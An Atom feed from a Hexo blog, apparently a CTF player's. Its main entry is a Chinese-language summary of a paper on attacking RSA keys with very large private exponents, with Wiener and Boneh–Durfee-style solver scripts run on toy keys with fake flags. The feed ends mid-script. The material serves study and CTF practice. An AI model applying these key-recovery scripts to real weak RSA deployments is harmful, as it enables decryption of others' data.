<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Alexei</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-02-25T05:16:00.369Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>An_Interesting_CTF_Challenge_0x2</title>
    <link href="http://example.com/2024/02/21/An-Interesting-CTF-Challenge-0x2/"/>
    <id>http://example.com/2024/02/21/An-Interesting-CTF-Challenge-0x2/</id>
    <published>2024-02-21T08:38:45.000Z</published>
    <updated>2024-02-25T05:16:00.369Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d8832c2b60bf78e7adcffaa4145a21153ce0772c9697032cc7a95faca128ffb8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">出了一道题，适时公开。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read :).</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Crypto_Papers_Read_&amp;_Recurrent</title>
    <link href="http://example.com/2024/01/29/Crypto-Papers-Read-Recurrent/"/>
    <id>http://example.com/2024/01/29/Crypto-Papers-Read-Recurrent/</id>
    <published>2024-01-29T12:15:36.000Z</published>
    <updated>2024-03-03T09:57:03.198Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>[TOC]</p><h1 id="0x01-RSA私钥过大的漏洞"><a href="#0x01-RSA私钥过大的漏洞" class="headerlink" title="0x01  RSA私钥过大的漏洞"></a>0x01  RSA私钥过大的漏洞</h1><p><a href="https://github.com/AL3XEI709/papers/blob/main/cacr2004-01.pdf">Link</a></p><blockquote><p>使用过小的RSA私钥指数引发的危险在十多年前就已经为人所知。用户虽然已知这些威胁，但依然希望从实质上降低解密时间，可能会倾向于使用一个与很大的私钥相关的<strong>小负素数</strong>。这篇论文展示了Wiener, Boneh &amp; Durfee, Blomer &amp; May的<strong>针对小私钥指数的攻击</strong>，以及由上述攻击延申的对含多个素数的RSA的攻击，<strong>同样适用于私钥指数非常大的情况</strong>。</p></blockquote><h2 id="1-1-低加密指数攻击"><a href="#1-1-低加密指数攻击" class="headerlink" title="1.1 低加密指数攻击"></a>1.1 低加密指数攻击</h2><p>考虑公钥指数$e&#x3D;3$ 的RSA。如果明文大小在 $0&lt;m&lt;N^{1&#x2F;3}$ 区间内，解密仅需简单的对密文 $c&#x3D;m^3\mod N$ 开三次方即可，因为 $m^3&lt;N$。考虑处于 $N-N^{1&#x2F;3}&lt;m&lt;N$ 区间内的明文。相应的，在有限域的表示里，$-N^{1&#x2F;3}&lt;m&lt;0$。令 $c&#x3D;m^3\mod N$ ，解密仅需计算出 $-c\mod N$ 的三次方，即 $m&#x3D;-^3\sqrt {-c}$​ 。</p><h2 id="1-2-连分数攻击-Wiener"><a href="#1-2-连分数攻击-Wiener" class="headerlink" title="1.2 连分数攻击( Wiener )"></a>1.2 连分数攻击( Wiener )</h2><p> 针对RSA小私钥指数的Wiener 攻击，可以轻而易举的扩展到针对大私钥指数的攻击。</p><p> <strong>定理1.</strong> 令RSA的模数为$N$，私钥指数$d$ 满足  $\sqrt 6 (\phi(N)-d)&lt;N^{1&#x2F;4}$ ，则公钥 $(N,e)$ 已知的情况下，在多项式时间 $\log_2N$ 内可以求得私钥。</p><p>由RSA公式：$ed\equiv 1\pmod {\phi(N)}$ ，可化为$e(d-\phi(N))\equiv1\pmod{\phi(N)}$ 。令 $D&#x3D;\phi(N)-d$，等式也可以写成<br>$$<br>eD&#x3D;-1+k\phi(N)<br>$$<br>$k$ 为正，且 $k&lt;D$。根据连分数的性质可求得</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401292106997.png" alt="image-20240129210633885"></p><p>因此，$k&#x2F;D$ 是 $e&#x2F;N$ 的一个连分数项。通过连分数算法我们可以计算所有$e&#x2F;N$ 连分数的子项，验证正确的 $k&#x2F;D$ 。令 $k’&#x2F;D’$ 是 $e&#x2F; N$ 连分数的子项，我们可以计算 $\phi’&#x3D;(eD’+1)&#x2F;k’$ 并尝试分解 $N$ 。当 $k’&#x2F;D’&#x3D;k&#x2F;D$ 时，$\phi’&#x3D;\phi(N)$，就能实现分解 $N$。$N$ 分解后，计算 $d&#x3D;e^{-1}\pmod {\phi(N)}$ ，自然地 $d&#x3D;\phi(N)-D$ 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes <span class="keyword">as</span> ltb, bytes_to_long <span class="keyword">as</span> btl </span><br><span class="line">DEBUG = <span class="literal">True</span> </span><br><span class="line">flag = <span class="string">b&#x27;AL3XEI_FAKE_FLAG&#x27;</span> </span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pq&quot;</span>] </span><br><span class="line">D = getPrime(<span class="number">250</span>) </span><br><span class="line">phi = ( p - <span class="number">1</span> ) * ( q - <span class="number">1</span> ) </span><br><span class="line">n = p * q </span><br><span class="line">d = phi - D </span><br><span class="line">e = <span class="built_in">int</span>(<span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)) </span><br><span class="line">m = btl(flag) </span><br><span class="line">c = <span class="built_in">pow</span>( m, e, n ) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123; n &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123; e &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123; c &#125;</span>&quot;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: </span><br><span class="line">    <span class="built_in">print</span>(D &lt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br><span class="line">    <span class="built_in">print</span>(d &gt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes <span class="keyword">as</span> ltb, bytes_to_long <span class="keyword">as</span> btl </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, powmod</span><br><span class="line"></span><br><span class="line">n = <span class="number">95808867301115765470157527057122018773590644850340036063660006144241016363461180542662128242331000493503329275886318638577802911609861754489409308916334153092827359773990576953494489066891754958489518296506864007107461706876199087038625529359792723687739032883111118846057885223348567281260289769095947114739</span></span><br><span class="line">e = <span class="number">72952655963278861108037401373646812489130641329155131272331089883876512873398927024065977145052641871946921270479021693525422184386907115823533940193059034867804357288283454791095127774996014754357236501690826434022717137945586271536049395574251666543980542223151708613680122933461729612145786142815818031273</span></span><br><span class="line">c = <span class="number">53092997544169330621514962087445873910366122537654477325262038832454410368350321012107129397993250333075127934864393405852932586277268828489217726268128591659958297693818569083093747501691292703602115477380424837002461549729989205851924387111864162444281585577571129538515105806533426232953865589872235703736</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> kD <span class="keyword">in</span> continued_fraction(e / n).convergents(): </span><br><span class="line">    k = kD.numer() </span><br><span class="line">    D = kD.denom() </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ( e * D + <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi =  ( e * D + <span class="number">1</span>) // k </span><br><span class="line">            d = phi - D </span><br><span class="line">            <span class="keyword">if</span> (e * d) % phi == <span class="number">1</span>:</span><br><span class="line">                m = powmod(c, d, n) </span><br><span class="line">                <span class="keyword">if</span> ltb(m) == <span class="string">b&#x27;AL3XEI_FAKE_FLAG&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(ltb(m))</span><br><span class="line">                    <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span> </span><br><span class="line"><span class="comment"># b&#x27;AL3XEI_FAKE_FLAG&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-3-小逆元攻击-Boneh-Durfee"><a href="#1-3-小逆元攻击-Boneh-Durfee" class="headerlink" title="1.3 小逆元攻击( Boneh &amp; Durfee )"></a>1.3 小逆元攻击( Boneh &amp; Durfee )</h2><p>Boneh &amp; Durfee 提出的小私钥指数攻击是建立在解决小逆元问题上的。也即，给定整数 $A，M$ ，求较小的 $x, y$ 使得 $x_0(A+y_0)\equiv1\pmod M$ 成立。特别的，对于RSA，令 $e&#x3D;N^\alpha, a\approx 1,d&lt;N^\sigma$ ，且 $f(x,y)&#x3D;x(N+y)-1$ 。我们希望能找到 $x_0,y_0$ 满足<br>$$<br>f(x_0,y_0)\equiv0\pmod e, |x_0|&lt;X&#x3D;N^\sigma,|y_0|&lt;Y&#x3D;3N^{1&#x2F;2}<br>$$<br> 上述方程的一个解是 $(x_0,y_0)&#x3D;(k,\phi(N)-N)$ ，$k$ 是正整数，满足$ed-k\phi(N)&#x3D;1$ 。求得这个解就能恢复 $\phi(N)$，就能通过 $d&#x3D;e^{-1}\pmod{\phi(N)}$ 求得私钥指数。Boneh &amp; Durfee 攻击能够成立的界是 $d&lt;N^{0.292}$。</p><p><strong>定理2.</strong> 对针对RSA小私钥指数的，基于小逆元攻击的方法，如果在 $d&lt;N^\sigma$ 情况下成立，则在 $d&gt;\phi(N)-N^\sigma$ 情况下也成立。</p><p>由RSA公式：$ed\equiv 1\pmod {\phi(N)}$ ，可化为$e(d-\phi(N))\equiv1\pmod{\phi(N)}$ 。等式也可以写成<br>$$<br>e(d-\phi(N))&#x3D;1-k\phi(N)<br>$$<br>$k$ 是正整数。令 $\phi(N)&#x3D;N-s$ ，通过模 $e$ 化简上式得：<br>$$<br>k(N-s)\equiv1\pmod e<br>$$<br>就可以回到与 Boneh &amp; Durfee 相同的证明开端了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes <span class="keyword">as</span> ltb, bytes_to_long <span class="keyword">as</span> btl </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, powmod</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span> </span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span> </span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pq&quot;</span>] </span><br><span class="line">D = getPrime(<span class="number">540</span>) </span><br><span class="line">phi = ( p - <span class="number">1</span> ) * ( q - <span class="number">1</span> ) </span><br><span class="line">n = p * q </span><br><span class="line">d = phi - D </span><br><span class="line">e = invert( d , phi ) </span><br><span class="line">m = btl(flag) </span><br><span class="line">c = powmod( m, e, n ) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123; n &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123; e &#125;</span>&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123; c &#125;</span>&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG: </span><br><span class="line">    <span class="built_in">print</span>(D &gt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br><span class="line">    <span class="built_in">print</span>(D &lt; <span class="built_in">int</span>(n ** <span class="number">0.292</span>)) <span class="comment"># True </span></span><br><span class="line">    <span class="built_in">print</span>(d &gt; <span class="built_in">int</span>(( <span class="number">1</span> / <span class="number">3</span> ) * ( n ** ( <span class="number">1</span> / <span class="number">4</span>) ))) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">17454240892015687399635575177782463616161801017744964167166316992000438567954208861858704118356652955895543759727399598219652374479058325078938844154779338116183919894891419788483356211997407257133952613665407522666496603990365551044544912774860275362169418589330692272365871488949028500291407860001016369169984907854821255776104896997216220723282349406685606354577234458755937573128776099775872248358967511724814180905677162892409900525389854774492481283983813437720598034450480461177689525965178110648561898417430930437145140807533085115195591689643648662097740190799143411720931700518856026602702302360314926568581</span></span><br><span class="line">e = <span class="number">9472006993547826181877085916606183877171725401573241100427062914489290602535688049520479075109689144033234591488273713331619169868277776404457381184219722908114354739230936611847952514920710043363745248830472607448666872189680733104753186945972120403917847805229221716562733943884585013414027178553329202033640398859269931922461240207274208439853712244625279285690529977956922186800245494612173821458113218295584900947198353069679892109333258929183299407108300066940097602478149733991650165151031726109016263727784120500243492720059756363698397568038439723237837754741573422562307026635896462445226918934233305349253</span></span><br><span class="line">c = <span class="number">1240657854997120373473014332608523393757721386238508695850715327588273623501287632954714961855717782376882473926702658353841377255541283813786687049622008163374731319510130187681404171234200455616300555070707234749208069265016493701063505624598166007497341750345394637926999347175052260081914034237980193514507441891510910739940736530593344530652245303015446165155575064961996683032595508784436618392009239809243617641142178739154782780714555447141295039415569516609387818390675962279010028151868723561757124514026977897984311634011594112400021778142416416388714397364046098677193619317349662802185788302396211384998</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P = Zmod(ZZ(e))[<span class="string">&quot;k,s&quot;</span>]</span><br><span class="line">k, s = P.gens()</span><br><span class="line">f = <span class="number">1</span> + k * (n - s)</span><br><span class="line">rs = small_roots(f, (<span class="number">2</span>**<span class="number">540</span>, <span class="number">2</span>**<span class="number">1025</span>), m=<span class="number">4</span>, d=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line">k, s = <span class="built_in">map</span>(<span class="built_in">int</span>, rs[<span class="number">0</span>])</span><br><span class="line">phi = n - s</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="1-4-含多个素数的-RSA"><a href="#1-4-含多个素数的-RSA" class="headerlink" title="1.4 含多个素数的 RSA"></a>1.4 含多个素数的 RSA</h2><p>接下来的攻击将上述RSA攻击扩展到了含多个素数的形式。</p><p><strong>定理3.</strong> 令 $N$ 是含 $r$ 个素数（大小相近）的RSA，$d$ 为私钥指数，且满足 $\sqrt {2(2r-1)}|\phi(N)-d|&lt;N^{1&#x2F;(2r)}$。则公钥 $(N,e)$ 已知的情况下，在多项式时间  $N$ 内可以求得私钥。</p><p>证明过程与 Wiener 攻击近乎一致，不再阐述。</p><p><strong>定理4.</strong> 对针对含多个素数的RSA小私钥指数的，基于小逆元攻击的方法，如果在 $d&lt;N^\sigma$ 情况下成立，则在 $d&gt;\phi(N)-N^\sigma$ 情况下也成立。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span> </span><br><span class="line">p,q,r = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;pqr&quot;</span>] </span><br><span class="line">n = p*q*r </span><br><span class="line">l = getPrime(<span class="number">490</span>)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">d = phi - l </span><br><span class="line">e = <span class="built_in">int</span>(<span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)) </span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;AL3XEI_FAKE_FLAG&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;down: &quot;</span>, <span class="built_in">int</span>((<span class="number">1</span>/<span class="number">3</span>)*(n**(<span class="number">1</span>/<span class="number">6</span>))).bit_length())  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;up: &quot;</span>, <span class="built_in">int</span>(<span class="built_in">pow</span>(n, <span class="number">0.292</span>)).bit_length())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;k:&quot;</span>, <span class="built_in">int</span>((e*l+<span class="number">1</span>)//phi).bit_length()) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;s:&quot;</span>, <span class="built_in">int</span>(-(- p*q-p*r-q*r+p+q+r-<span class="number">1</span>)).bit_length(), (e*l+<span class="number">1</span>)%phi)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span 